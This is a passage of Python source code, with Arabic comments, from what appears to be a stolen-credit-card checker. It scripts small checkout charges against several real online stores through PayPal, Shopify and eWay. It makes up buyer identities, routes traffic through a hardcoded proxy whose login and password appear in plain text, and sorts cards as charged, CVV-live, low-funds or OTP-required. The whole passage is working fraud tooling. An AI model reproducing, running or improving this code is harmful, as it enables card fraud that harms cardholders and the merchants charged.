                'authority': 'body-pleasure-piercing-online.myshopify.com',
                'accept': 'application/json',
                'accept-language': 'en-AU',
                'content-type': 'application/json',
                'origin': 'https://body-pleasure-piercing-online.myshopify.com',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'shopify-checkout-client': 'checkout-web/1.0',
                'user-agent': user,
            }
            
            params = {
                'operationName': 'SubmitForCompletion',
            }
            
            json_data2 = {
                'variables': {
                    'input': {
                        'sessionInput': {
                            'sessionToken': session_id,
                        },
                        'queueToken': None,
                        'discounts': {
                            'lines': [],
                            'acceptUnexpectedDiscounts': True,
                        },
                        'delivery': {
                            'deliveryLines': [
                                {
                                    'destination': {
                                        'streetAddress': {
                                            'address1': 'New York State',
                                            'address2': '',
                                            'city': 'New York',
                                            'countryCode': 'US',
                                            'postalCode': '10080',
                                            'firstName': user_info['first_name'],
                                            'lastName': user_info['last_name'],
                                            'zoneCode': 'NY',
                                            'phone': '+12702871380',
                                            'oneTimeUse': False,
                                        },
                                    },
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyByHandle': {
                                            'handle': 'f17125499bce1813917061569d00dae0-30fa004dab6717298f0a6eb2433e42a3',
                                            'customDeliveryRate': False,
                                        },
                                        'options': {},
                                    },
                                    'targetMerchandiseLines': {
                                        'lines': [
                                            {
                                                'stableId': stable_id,
                                            },
                                        ],
                                    },
                                    'deliveryMethodTypes': [
                                        'SHIPPING',
                                    ],
                                    'expectedTotalPrice': {
                                        'value': {
                                            'amount': '32.13',
                                            'currencyCode': 'USD',
                                        },
                                    },
                                    'destinationChanged': False,
                                },
                            ],
                            'noDeliveryRequired': [],
                            'useProgressiveRates': False,
                            'prefetchShippingRatesStrategy': None,
                            'supportsSplitShipping': True,
                        },
                        'merchandise': {
                            'merchandiseLines': [
                                {
                                    'stableId': stable_id,
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': 'gid://shopify/ProductVariantMerchandise/34206247485484',
                                            'variantId': 'gid://shopify/ProductVariant/34206247485484',
                                            'properties': [],
                                            'sellingPlanId': None,
                                            'sellingPlanDigest': None,
                                        },
                                    },
                                    'quantity': {
                                        'items': {
                                            'value': 1,
                                        },
                                    },
                                    'expectedTotalPrice': {
                                        'value': {
                                            'amount': '8.57',
                                            'currencyCode': 'USD',
                                        },
                                    },
                                    'lineComponentsSource': None,
                                    'lineComponents': [],
                                },
                            ],
                        },
                        'memberships': {
                            'memberships': [],
                        },
                        'payment': {
                            'totalAmount': {
                                'any': True,
                            },
                            'paymentLines': [
                                {
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': payment_method_id,
                                            'sessionId': session_id,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': 'New York State',
                                                    'address2': '',
                                                    'city': 'New York',
                                                    'countryCode': 'US',
                                                    'postalCode': '10080',
                                                    'firstName': user_info['first_name'],
                                                    'lastName': user_info['last_name'],
                                                    'zoneCode': 'NY',
                                                    'phone': '+12702871380',
                                                },
                                            },
                                            'cardSource': None,
                                        },
                                        'giftCardPaymentMethod': None,
                                        'redeemablePaymentMethod': None,
                                        'walletPaymentMethod': None,
                                        'walletsPlatformPaymentMethod': None,
                                        'localPaymentMethod': None,
                                        'paymentOnDeliveryMethod': None,
                                        'paymentOnDeliveryMethod2': None,
                                        'manualPaymentMethod': None,
                                        'customPaymentMethod': None,
                                        'offsitePaymentMethod': None,
                                        'customOnsitePaymentMethod': None,
                                        'deferredPaymentMethod': None,
                                        'customerCreditCardPaymentMethod': None,
                                        'paypalBillingAgreementPaymentMethod': None,
                                        'remotePaymentInstrument': None,
                                    },
                                    'amount': {
                                        'value': {
                                            'amount': '40.7',
                                            'currencyCode': 'USD',
                                        },
                                    },
                                },
                            ],
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': 'New York State',
                                    'address2': '',
                                    'city': 'New York',
                                    'countryCode': 'US',
                                    'postalCode': '10080',
                                    'firstName': user_info['first_name'],
                                    'lastName': user_info['last_name'],
                                    'zoneCode': 'NY',
                                    'phone': '+12702871380',
                                },
                            },
                        },
                        'buyerIdentity': {
                            'customer': {
                                'presentmentCurrency': 'USD',
                                'countryCode': 'US',
                            },
                            'email': user_info['email'],
                            'emailChanged': False,
                            'phoneCountryCode': 'US',
                            'marketingConsent': [
                                {
                                    'email': {
                                        'value': user_info['email'],
                                    },
                                },
                            ],
                            'shopPayOptInPhone': {
                                'number': '+12702871380',
                                'countryCode': 'US',
                            },
                            'rememberMe': False,
                        },
                        'tip': {
                            'tipLines': [],
                        },
                        'taxes': {
                            'proposedAllocations': None,
                            'proposedTotalAmount': {
                                'value': {
                                    'amount': '0',
                                    'currencyCode': 'USD',
                                },
                            },
                            'proposedTotalIncludedAmount': None,
                            'proposedMixedStateTotalAmount': None,
                            'proposedExemptions': [],
                        },
                        'note': {
                            'message': None,
                            'customAttributes': [],
                        },
                        'localizationExtension': {
                            'fields': [],
                        },
                        'nonNegotiableTerms': None,
                        'scriptFingerprint': {
                            'signature': None,
                            'signatureUuid': None,
                            'lineItemScriptChanges': [],
                            'paymentScriptChanges': [],
                            'shippingScriptChanges': [],
                        },
                        'optionalDuties': {
                            'buyerRefusesDuties': False,
                        },
                        'cartMetafields': [],
                    },
                    'attemptToken': f'{stable_id[:20]}-{uuid.uuid4().hex[:12]}',
                    'metafields': [],
                },
                'operationName': 'SubmitForCompletion',
                'id': 'd32830e07b8dcb881c73c771b679bcb141b0483bd561eced170c4feecc988a59',
            }
            
            response2 = r.post(
                'https://body-pleasure-piercing-online.myshopify.com/checkouts/internal/graphql/persisted',
                params=params,
                cookies=cookies,
                headers=headers2,
                json=json_data2,
            )
            
            return self._parse_shopify_response(response2.text), user_info
            
        except Exception as e:
            return {'status': 'ERROR', 'message': f'❌ Gateway Error', 'code': 'ERROR'}, None
    
    def _parse_shopify_error(self, text):
        """تحليل أخطاء Shopify"""
        text = str(text).upper()
        
        if 'INVALID_NUMBER' in text or 'INCORRECT_NUMBER' in text or 'INVALID NUMBER' in text:
            return {'status': 'INVALID_NUMBER', 'message': '❌ Invalid Card Number', 'code': 'DECLINED'}
        elif 'INVALID_EXPIRY' in text or 'EXPIRED' in text or 'EXPIRY' in text:
            return {'status': 'EXPIRED_CARD', 'message': '❌ Expired Card', 'code': 'DECLINED'}
        elif 'INVALID_CVC' in text or 'INCORRECT_CVC' in text or 'CVV' in text or 'CVC' in text:
            return {'status': 'CVV_FAILURE', 'message': '❌ Invalid CVV', 'code': 'DECLINED'}
        elif 'CARD_DECLINED' in text or 'DECLINED' in text:
            return {'status': 'DECLINED', 'message': '❌ Card Declined', 'code': 'DECLINED'}
        elif 'INSUFFICIENT' in text:
            return {'status': 'INSUFFICIENT_FUNDS', 'message': '❌ Insufficient Funds', 'code': 'DECLINED'}
        elif 'DO_NOT_HONOR' in text or 'DO NOT HONOR' in text:
            return {'status': 'DO_NOT_HONOR', 'message': '❌ Do Not Honor', 'code': 'DECLINED'}
        elif 'FRAUD' in text:
            return {'status': 'SUSPECTED_FRAUD', 'message': '❌ Suspected Fraud', 'code': 'DECLINED'}
        elif 'LOST' in text or 'STOLEN' in text:
            return {'status': 'LOST_OR_STOLEN', 'message': '❌ Lost Or Stolen Card', 'code': 'DECLINED'}
        else:
            return {'status': 'ERROR', 'message': '❌ Gateway Error', 'code': 'ERROR'}
    
    def check_card_switchupcb(self, ccx):
        """بوابة SwitchUpCB - PayPal Real API"""
        try:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
            ccx = ccx.strip()
            parts = ccx.split("|")
            if len(parts) < 4:
                return {'status': 'ERROR', 'message': '❌ Invalid Format', 'code': 'ERROR'}, None
            
            n = parts[0]
            mm = parts[1]
            yy = parts[2]
            cvc = parts[3]
            
            if "20" in yy:
                yy = yy.split("20")[1] if len(yy) > 2 else yy
            
            user = self.get_random_user_agent()
            r = requests.session()
            
            # إعداد البروكسي
            proxy = {
                "http": "http://llewellynashleybowen:rNXaRJfNPN233zw@136.179.19.164:3128",
                "https": "http://llewellynashleybowen:rNXaRJfNPN233zw@136.179.19.164:3128"
            }
            r.proxies.update(proxy)
            
            # توليد بيانات عشوائية
            first_names = ["Ahmed", "Mohamed", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah"]
            last_names = ["Smith", "Johnson", "Williams", "Brown", "Garcia", "Martinez"]
            cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
            states = ["NY", "CA", "IL", "TX", "AZ"]
            streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"]
            zip_codes = ["10001", "90001", "60601", "77001", "85001"]
            
            first_name = random.choice(first_names)
            last_name = random.choice(last_names)
            city = random.choice(cities)
            state = states[cities.index(city)]
            street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
            zip_code = zip_codes[states.index(state)]
            
            acc = ''.join(random.choices(string.ascii_lowercase, k=20)) + str(random.randint(1000, 9999)) + "@gmail.com"
            num = "303" + ''.join(random.choices(string.digits, k=7))
            
            user_info = {
                'name': f"{first_name} {last_name}",
                'email': acc,
                'address': f"{street_address}, {city}, {state} {zip_code}"
            }
            
            # الخطوة 1: إضافة المنتج للسلة
            files = {
                'wpc_name_your_price': (None, '1.00'),
                'quantity': (None, '1'),
                'add-to-cart': (None, '4744'),
            }
            
            multipart_data = MultipartEncoder(fields=files)
            headers = {
                'authority': 'switchupcb.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': multipart_data.content_type,
                'user-agent': user,
            }
            
            response = r.post('https://switchupcb.com/shop/drive-me-so-crazy/', headers=headers, data=multipart_data, verify=False)
            
            # الخطوة 2: الحصول على صفحة الدفع
            headers = {
                'authority': 'switchupcb.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'referer': 'https://switchupcb.com/cart/',
                'user-agent': user,
            }
            
            response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers, verify=False)
            
            # استخراج الـ nonces
            try:
                sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
                nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1)
                check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
                create = re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1)
            except:
                return {'status': 'ERROR', 'message': '❌ Failed to get tokens', 'code': 'ERROR'}, user_info
            
            # الخطوة 3: حفظ نموذج الدفع
            headers = {
                'authority': 'switchupcb.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://switchupcb.com',
                'referer': 'https://switchupcb.com/checkout/',
                'user-agent': user,
            }
            
            form_encoded = f'billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street_address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce={check}&ppcp-funding-source=card'
            
            json_data = {
                'nonce': nonce,
                'form_encoded': form_encoded,
            }
            
            response = r.post('https://switchupcb.com/?wc-ajax=ppc-save-checkout-form', cookies=r.cookies, headers=headers, json=json_data, verify=False)
            
            # الخطوة 4: إنشاء الطلب
            json_data = {
                'nonce': create,
                'payer': None,
                'bn_code': 'Woo_PPCP',
                'context': 'checkout',
                'order_id': '0',
                'payment_method': 'ppcp-gateway',
                'funding_source': 'card',
                'form_encoded': form_encoded,
                'createaccount': False,
                'save_payment_method': False,
            }
            
            response = r.post('https://switchupcb.com/?wc-ajax=ppc-create-order', cookies=r.cookies, headers=headers, json=json_data, verify=False)
            
            try:
                order_id = response.json()['data']['id']
                pcp = response.json()['data']['custom_id']
            except:
                return {'status': 'ERROR', 'message': '❌ Failed to create order', 'code': 'ERROR'}, user_info
            
            # الخطوة 5: الحصول على صفحة بطاقة PayPal
            lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
            
            session_id = f'uid_{lol1}_{lol3}'
            button_session_id = f'uid_{lol2}_{lol3}'
            
            headers = {
                'authority': 'www.paypal.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': user,
            }
            
            params = {
                'sessionID': session_id,
                'buttonSessionID': button_session_id,
                'locale.x': 'en_US',
                'commit': 'true',
                'env': 'production',
                'token': order_id,
            }
            
            response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, verify=False)
            
            # الخطوة 6: إرسال بيانات البطاقة عبر GraphQL
            headers = {
                'authority': 'www.paypal.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://www.paypal.com',
                'user-agent': user,
                'x-app-name': 'standardcardfields',
                'x-country': 'US',
            }
            
            json_data = {
                'query': '''
                mutation payWithCard(
                    $token: String!
                    $card: CardInput!
                    $phoneNumber: String
                    $firstName: String
                    $lastName: String
                    $shippingAddress: AddressInput
                    $billingAddress: AddressInput
                    $email: String
                    $currencyConversionType: CheckoutCurrencyConversionType
                    $installmentTerm: Int
                ) {
                    approveGuestPaymentWithCreditCard(
                        token: $token
                        card: $card
                        phoneNumber: $phoneNumber
                        firstName: $firstName
                        lastName: $lastName
                        email: $email
                        shippingAddress: $shippingAddress
                        billingAddress: $billingAddress
                        currencyConversionType: $currencyConversionType
                        installmentTerm: $installmentTerm
                    ) {
                        flags {
                            is3DSecureRequired
                        }
                        cart {
                            intent
                            cartId
                            buyer {
                                userId
                                auth {
                                    accessToken
                                }
                            }
                            returnUrl {
                                href
                            }
                        }
                        paymentContingencies {
                            threeDomainSecure {
                                status
                                method
                                redirectUrl {
                                    href
                                }
                                parameter
                            }
                        }
                    }
                }
                ''',
                'variables': {
                    'token': order_id,
                    'card': {
                        'cardNumber': n,
                        'expirationDate': mm + '/20' + yy,
                        'postalCode': zip_code,
                        'securityCode': cvc,
                    },
                    'firstName': first_name,
                    'lastName': last_name,
                    'billingAddress': {
                        'givenName': first_name,
                        'familyName': last_name,
                        'line1': street_address,
                        'line2': None,
                        'city': city,
                        'state': state,
                        'postalCode': zip_code,
                        'country': 'US',
                    },
                    'email': acc,
                    'currencyConversionType': 'PAYPAL',
                },
                'operationName': None,
            }
            
            response = requests.post(
                'https://www.paypal.com/graphql?fetch_credit_form_submit',
                headers=headers,
                json=json_data,
                proxies=proxy,
                verify=False
            )
            
            last = response.text
            
            # تحليل النتيجة
            if ('ADD_SHIPPING_ERROR' in last or
                'NEED_CREDIT_CARD' in last or
                '"status": "succeeded"' in last or
                'Thank You For Donation.' in last or
                'Your payment has already been processed' in last or
                'Success ' in last or
                '"type":"one-time"' in last or
                '/donations/thank_you?donation_number=' in last):
                return {'status': 'CHARGED', 'message': '✅ Charged $1.00', 'code': 'APPROVED'}, user_info
            elif 'is3DSecureRequired' in last:
                return {'status': 'OTP', 'message': '⚠️ 3D Secure/OTP Required', 'code': 'APPROVED'}, user_info
            elif 'OAS_VALIDATION_ERROR' in last or 'INVALID_BILLING_ADDRESS' in last:
                return {'status': 'INSUFFICIENT_FUNDS', 'message': '❌ Insufficient Funds', 'code': 'DECLINED'}, user_info
            else:
                try:
                    message = response.json()['errors'][0]['message']
                    code = response.json()['errors'][0]['data'][0]['code']
                    return {'status': code, 'message': f'❌ {message}', 'code': 'DECLINED'}, user_info
                except:
                    return {'status': 'DECLINED', 'message': '❌ Card Declined', 'code': 'DECLINED'}, user_info
                    
        except Exception as e:
            return {'status': 'ERROR', 'message': f'❌ Gateway Error', 'code': 'ERROR'}, None
    
    def capture(self, text, start, end):
        ""دالة مساعدة لاستخراج النص"""
        try:
            return text.split(start)[1].split(end)[0]
        except:
            return ""
    
    async def check_card_sportyshealth(self, ccx):
        """بوابة SportysHealth - eWay 3D Secure"""
        try:
            import httpx
            import urllib.parse
            import base64
            import asyncio
            
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return {'status': 'ERROR', 'message': '❌ Invalid Format', 'code': 'ERROR'}, None
            
            cc = parts[0]
            month = parts[1].zfill(2)
            year = parts[2][-2:] if len(parts[2]) == 4 else parts[2]
            cvv = parts[3]
            
            user_info = {
                'name': 'Sachio YT',
                'email': 'sachiopremiun@gmail.com',
                'address': '118 W 132nd St, Banjup, WA 6164, AU'
            }
            
            async with httpx.AsyncClient(follow_redirects=True, verify=False, timeout=60.0) as session:
                # الخطوة 1: الحصول على صفحة المنتج
                head = {
                    "Host": "www.sportyshealth.com.au",
                    "User-Agent": self.get_random_user_agent(),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                }
                
                r = await session.get(
                    "https://www.sportyshealth.com.au/Sportys-Health-Blender-Bottle-Shaker.html",
                    headers=head,
                )
                cookies_1 = "; ".join([f"{key}={value}" for key, value in r.cookies.items()])
                xi = urllib.parse.unquote(self.capture(cookies_1, "xid_sph_364e1=Set-Cookie: xid_sph_364e1=", ";"))
                if not xi:
                    xi = self.capture(cookies_1, "xid_sph_364e1=", ";")
                
                # الخطوة 2: إضافة للسلة
                head2 = {
                    "Host": "www.sportyshealth.com.au",
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "User-Agent": self.get_random_user_agent(),
                    "Origin": "https://www.sportyshealth.com.au",
                    "Referer": "https://www.sportyshealth.com.au/Sportys-Health-Blender-Bottle-Shaker.html",
                }
                
                post2 = "mode=add&productid=7776&cat=&page=&product_options%5B6036%5D=11590&product_options%5B6037%5D=11591&amount=1"
                await session.post("https://www.sportyshealth.com.au/cart.php", headers=head2, data=post2)
                await asyncio.sleep(2)
                
                # الخطوة 3: الذهاب للدفع
                head3 = {
                    "Host": "www.sportyshealth.com.au",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "User-Agent": self.get_random_user_agent(),
                    "Referer": "https://www.sportyshealth.com.au/Sportys-Health-Blender-Bottle-Shaker.html",
                }
                await session.get("https://www.sportyshealth.com.au/cart.php?mode=checkout", headers=head3)
                await asyncio.sleep(2)
                
                # الخطوة 4: إدخال بيانات الشحن
                head4 = {
                    "Host": "www.sportyshealth.com.au",
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "User-Agent": self.get_random_user_agent(),
                    "Origin": "https://www.sportyshealth.com.au",
                    "Referer": "https://www.sportyshealth.com.au/cart.php?mode=checkout",
                }
                
                post4 = f"usertype=C&anonymous=Y&xid_sph_364e1={xi}&address_book%5BB%5D%5Bfirstname%5D=Sachio&address_book%5BB%5D%5Blastname%5D=YT&address_book%5BB%5D%5Baddress%5D=118+W+132nd+St&address_book%5BB%5D%5Baddress_2%5D=YT&address_book%5BB%5D%5Bcity%5D=Banjup&address_book%5BB%5D%5Bstate%5D=WA&address_book%5BB%5D%5Bcountry%5D=AU&address_book%5BB%5D%5Bzipcode%5D=6164&address_book%5BB%5D%5Bphone%5D=19006318646&email=sachiopremiun%40gmail.com&pending_membershipid=&reg_code=&uname=&password_is_modified=N&passwd1=&passwd2=&address_book%5BS%5D%5Bfirstname%5D=&address_book%5BS%5D%5Blastname%5D=&address_book%5BS%5D%5Baddress%5D=&address_book%5BS%5D%5Baddress_2%5D=&address_book%5BS%5D%5Bcity%5D=Bundall&address_book%5BS%5D%5Bstate%5D=QLD&address_book%5BS%5D%5Bcountry%5D=AU&address_book%5BS%5D%5Bzipcode%5D=4217&address_book%5BS%5D%5Bphone%5D=&address_book%5BS%5D%5Bemail%5D="
                await session.post("https://www.sportyshealth.com.au/cart.php?mode=checkout", headers=head4, data=post4)
                await asyncio.sleep(2)
                
                # الخطوة 5: اختيار الشحن
                post5 = "shippingid=202&mode=checkout&action=update"
                await session.post("https://www.sportyshealth.com.au/cart.php?mode=checkout", headers=head4, data=post5)
                await asyncio.sleep(2)
                
                # الخطوة 6: الدفع
                head6 = {
                    "Host": "www.sportyshealth.com.au",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "User-Agent": self.get_random_user_agent(),
                    "Origin": "https://www.sportyshealth.com.au",
                    "Referer": "https://www.sportyshealth.com.au/cart.php?mode=checkout",
                }
                
                post6 = f"paymentid=26&action=place_order&xid_sph_364e1={xi}&payment_method=Credit+Card+-+eWay+3DSecure&Customer_Notes=&authority_to_leave=1&accept_terms=Y"
                r6 = await session.post("https://www.sportyshealth.com.au/payment/payment_cc.php", headers=head6, data=post6)
                
                ew = self.capture(r6.text, '"https://secure.ewaypayments.com/sharedpage/sharedpayment?AccessCode=', '"')
                bi = self.capture(r6.text, "?ordr=", "&")
                
                if not ew:
                    return {'status': 'ERROR', 'message': '❌ Failed to get eWay token', 'code': 'ERROR'}, user_info
                
                # الخطوة 7: إرسال بيانات البطاقة لـ eWay
                head7 = {
                    "Host": "secure.ewaypayments.com",
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "User-Agent": self.get_random_user_agent(),
                    "Origin": "https://secure.ewaypayments.com",
                    "Referer": f"https://secure.ewaypayments.com/sharedpage/sharedpayment?v=2&AccessCode={ew}&View=Modal",
                }
                
                post7 = f"EWAY_ACCESSCODE={ew}&EWAY_VIEW=Modal&EWAY_ISSHAREDPAYMENT=true&EWAY_ISMODALPAGE=true&EWAY_APPLYSURCHARGE=true&EWAY_CUSTOMERREADONLY=False&PAYMENT_TRANTYPE=Purchase&AMEXEC_ENCRYPTED_DATA=&EWAY_PAYMENTTYPE=creditcard&EWAY_CUSTOMEREMAIL=ascasc%40gmail.com&EWAY_CUSTOMERPHONE=2240396666&EWAY_CARDNUMBER={cc}&EWAY_CARDNAME=assacsac&EWAY_CARDEXPIRYMONTH={month}&EWAY_CARDEXPIRYYEAR={year}&EWAY_CARDCVN={cvv}&AMEXEC_RESPONSE="
                await session.post("https://secure.ewaypayments.com/sharedpage/SharedPayment/ProcessPayment", headers=head7, data=post7)
                
                # الخطوة 8: الحصول على JWT
                head8 = {
                    "Host": "cerberus.prodcde.ewaylabs.cloud",
                    "accept": "application/json",
                    "user-agent": self.get_random_user_agent(),
                    "origin": "https://secure.ewaypayments.com",
                    "referer": "https://secure.ewaypayments.com/",
                }
                
                r8 = await session.get(f"https://cerberus.prodcde.ewaylabs.cloud/transactions/{ew}/queryInit", headers=head8)
                jt = self.capture(r8.text, '"jwt":"', '"')
                
                if jt:
                    # الخطوة 9: Cardinal Commerce
                    head9 = {
                        "Host": "centinelapi.cardinalcommerce.com",
                        "content-type": "application/json;charset=UTF-8",
                        "user-agent": self.get_random_user_agent(),
                        "accept": "*/*",
                        "origin": "https://secure.ewaypayments.com",
                        "referer": "https://secure.ewaypayments.com/",
                    }
                    
                    post9 = {
                        'BrowserPayload': {
                            'Order': {'OrderDetails': {}, 'Consumer': {'BillingAddress': {}, 'ShippingAddress': {}, 'Account': {}}, 'Cart': [], 'Token': {}, 'Authorization': {}, 'Options': {}, 'CCAExtension': {}},
                            'SupportsAlternativePayments': {'cca': True, 'hostedFields': False, 'applepay': False, 'discoverwallet': False, 'wallet': False, 'paypal': False, 'visacheckout': False},
                        },
                        'Client': {'Agent': 'SongbirdJS', 'Version': '1.35.0'},
                        'ConsumerSessionId': '0_9c9cd616-e6e8-4d9a-b6ac-e3429584375d',
                        'ServerJWT': jt,
                    }
                    
                    await asyncio.sleep(5)
                    r9 = await session.post("https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init", headers=head9, json=post9)
                    
                    # الخطوة 10: Enroll
                    head12 = {
                        "Host": "cerberus.prodcde.ewaylabs.cloud",
                        "x-browser": "false,es-419,24,800,360,300",
                        "user-agent": self.get_random_user_agent(),
                        "content-type": "text/plain",
                        "accept": "application/json",
                        "origin": "https://secure.ewaypayments.com",
                        "referer": "https://secure.ewaypayments.com/",
                    }
                    await session.put(f"https://cerberus.prodcde.ewaylabs.cloud/transactions/{ew}/enroll", headers=head12)
                
                # الخطوة 11: Complete 3D
                head13 = {
                    "Host": "secure.ewaypayments.com",
                    "User-Agent": self.get_random_user_agent(),
                    "Accept": "*/*",
                    "Referer": f"https://secure.ewaypayments.com/sharedpage/sharedpayment?v=2&AccessCode={ew}&View=Modal",
                }
                await session.post(f"https://secure.ewaypayments.com/Complete3D/{ew}", headers=head13)
                
                # الخطوة 12: الحصول على النتيجة
                head15 = {
                    "Host": "www.sportyshealth.com.au",
                    "User-Agent": self.get_random_user_agent(),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "Referer": "https://www.sportyshealth.com.au/payment/payment_cc.php",
                }
                
                r15 = await session.get(f"https://www.sportyshealth.com.au/payment/cc_eway_iframe_results.php?ordr={bi}&PageSpeed=Off&AccessCode={ew}", headers=head15)
                r15_text = r15.text
                
                msg = self.capture(r15_text, '"form-text">Reason:</span> ', " <br />")
                code = self.capture(r15_text, "ResponseCode: ", "<br />")
                msg2 = self.capture(r15_text, "ResponseMessage: ", "<br />")
                
                # تحليل النتيجة
                if r15.status_code == 302 or (code and "00" in code) or (msg2 and ("00" in msg2 or "A" in msg2)):
                    return {'status': 'CHARGED', 'message': '✅ Charged $9.95', 'code': 'APPROVED'}, user_info
                elif msg2 and "D4482" in msg2:
                    return {'status': 'CVV_LIVE', 'message': '⚠️ CVV Live (CCN)', 'code': 'APPROVED'}, user_info
                elif code and "06" in code:
                    return {'status': 'CVV_LIVE', 'message': '⚠️ CVV Live (CCN)', 'code': 'APPROVED'}, user_info
                elif msg2 and ("51" in msg2 or "D4451" in msg2):
                    return {'status': 'LOW_FUNDS', 'message': '⚠️ Low Funds', 'code': 'APPROVED'}, user_info
                else:
                    return {'status': 'DECLINED', 'message': f'❌ {msg or msg2 or "Declined"}', 'code': 'DECLINED'}, user_info
                    
        except Exception as e:
            return {'status': 'ERROR', 'message': '❌ Gateway Error', 'code': 'ERROR'}, None
    
    def _parse_shopify_response(self, text):
        ""تحليل استجابة Shopify""""
        text = text.upper()
        
        if 'COMPLETED' in text or 'SUCCESS' in text or 'APPROVED' in text:
            return {'status': 'CHARGED', 'message': '✅ Charged $8.57', 'code': 'APPROVED'}
        elif 'CARD_DECLINED' in text or 'DECLINED' in text:
            return {'status': 'DECLINED', 'message': '❌ Card Declined', 'code': 'DECLINED'}
        elif 'INSUFFICIENT_FUNDS' in text:
            return {'status': 'INSUFFICIENT_FUNDS', 'message': '❌ Insufficient Funds', 'code': 'DECLINED'}
        elif 'INVALID_NUMBER' in text or 'INCORRECT_NUMBER' in text:
            return {'status': 'INVALID_NUMBER', 'message': '❌ Invalid Card Number', 'code': 'DECLINED'}
        elif 'INVALID_EXPIRY' in text or 'EXPIRED' in text:
            return {'status': 'EXPIRED_CARD', 'message': '❌ Expired Card', 'code': 'DECLINED'}
        elif 'INVALID_CVC' in text or 'INCORRECT_CVC' in text or 'CVV' in text:
            return {'status': 'CVV_FAILURE', 'message': '❌ Invalid CVV', 'code': 'DECLINED'}
        elif 'FRAUD' in text or 'SUSPECTED_FRAUD' in text:
            return {'status': 'SUSPECTED_FRAUD', 'message': '❌ Suspected Fraud', 'code': 'DECLINED'}
        elif 'DO_NOT_HONOR' in text:
            return {'status': 'DO_NOT_HONOR', 'message': '❌ Do Not Honor', 'code': 'DECLINED'}
        elif 'LOST' in text or 'STOLEN' in text:
            return {'status': 'LOST_OR_STOLEN', 'message': '❌ Lost Or Stolen Card', 'code': 'DECLINED'}
        elif 'PROCESSING_ERROR' in text:
            return {'status': 'PROCESSING_ERROR', 'message': '❌ Processing Error', 'code': 'DECLINED'}
        elif 'AUTHENTICATION_REQUIRED' in text or '3D_SECURE' in text:
            return {'status': '3DS_REQUIRED', 'message': '⚠️ 3D Secure Required', 'code': 'DECLINED'}
        elif 'RATE_LIMIT' in text:
            return {'status': 'RATE_LIMIT', 'message': '❌ Rate Limited', 'code': 'ERROR'}
        elif 'ERROR' in text:
            return {'status': 'ERROR', 'message': '❌ Gateway Error', 'code': 'ERROR'}
        else:
            return {'status': 'UNKNOWN', 'message': '❓ Unknown Response', 'code': 'UNKNOWN'}
    
    def process_single_card(self, card_line, gateway_type="crisiscafe"):
        """معالجة بطاقة واحدة باستخدام البوابة المحددة"""
        start_time = time.time()
        
        # تحليل البطاقة
        parsed = self.parse_card_line(card_line)
        if not parsed:
            return {
                'status': 'INVALID_FORMAT',
                'message': '❌ تنسيق البطاقة غير صحيح',
                'time': 0,
                'card_display': card_line
            }
        
        number, month, year, cvv = parsed
        
        # فحوصات أولية
        if not self.luhn_check(number):
            return {
                'status': 'INVALID_CARD',
                'message': '❌ رقم البطاقة غير صحيح (Luhn Check Failed)',
                'time': round(time.time() - start_time, 1),
                'card_display': f"{number[:6]}******{number[-4:]}",
                'card_info': self.get_card_info(number)
            }
        
        expiry_valid, expiry_msg = self.check_expiry(month, year)
        if not expiry_valid:
            return {
                'status': expiry_msg,
                'message': f'❌ البطاقة {expiry_msg.lower()}',
